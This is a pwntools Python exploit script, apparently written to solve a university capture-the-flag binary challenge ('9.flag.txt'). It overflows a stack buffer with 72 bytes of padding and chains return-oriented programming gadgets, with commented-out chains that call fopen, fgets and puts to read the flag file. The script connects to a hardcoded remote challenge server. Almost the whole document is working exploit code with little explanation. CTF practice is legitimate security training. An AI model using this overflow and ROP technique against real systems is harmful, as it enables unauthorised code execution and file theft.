
from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        b *vuln+110
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve():
    p = conn()
    # p = process("./6")
    context.arch = 'amd64'

    context.log_level = 'debug'
    # p.sendlineafter(b"NIM:", b"13523035")
    # p.sendlineafter(b"Challenge:", b"9")

    plt_puts = 0x401070
    plt_fgets = 0x4010c0
    plt_fopen = 0x401100
    got_puts = 0x404020
    got_fgets = 0x404048
    got_fopen = 0x404068
    bss_start = 0x4041c0
    pop_rdi = 0x40128e
    pop_rsi = 0x40128c

    filename = 0x402052  # "9.flag.txt" (absolute address)
    mode = 0x402071
    padding = b"A" * 72  
    # fopen_chain = flat(
    #     pop_rdi,                 # Gadget to control `rdi`
    #     filename,                # rdi = Address of "9.flag.txt"
    #     pop_rsi,                 # Gadget to control `rsi`
    #     mode,                    # rsi = Address of "r"
    #     0x0,                     # pop_rsi's extra value (dummy for alignment)
    #     plt_fopen                # Call fopen@plt
    # )

    # fgets_chain = flat(
    #     pop_rdi,                 # Gadget to set `rdi` = buffer
    #     bss_start,               # Address to store the flag
    #     pop_rsi,                 # Gadget to set `rsi` = size
    #     0x90,                   # Size = 256 bytes
    #     0x0,                     # Dummy value for `r15`
    #     plt_fgets                # Call fgets@plt
    # )

    # puts_chain = flat(
    #     pop_rdi,                 # Gadget to set `rdi` = buffer
    #     bss_start,               # Address of the buffer containing the flag
    #     plt_puts                 # Call puts@plt
    # )

    payload = flat(
        padding,
        pop_rdi,
        0x3,
        0x4014af,
    )
    with open("payload.bin", "wb") as f:
        f.write(payload)

    # write your payload here
    p.sendline(payload) # meng-inject payload ke dalam binary
    p.interactive() # flush to stdout 

solve()

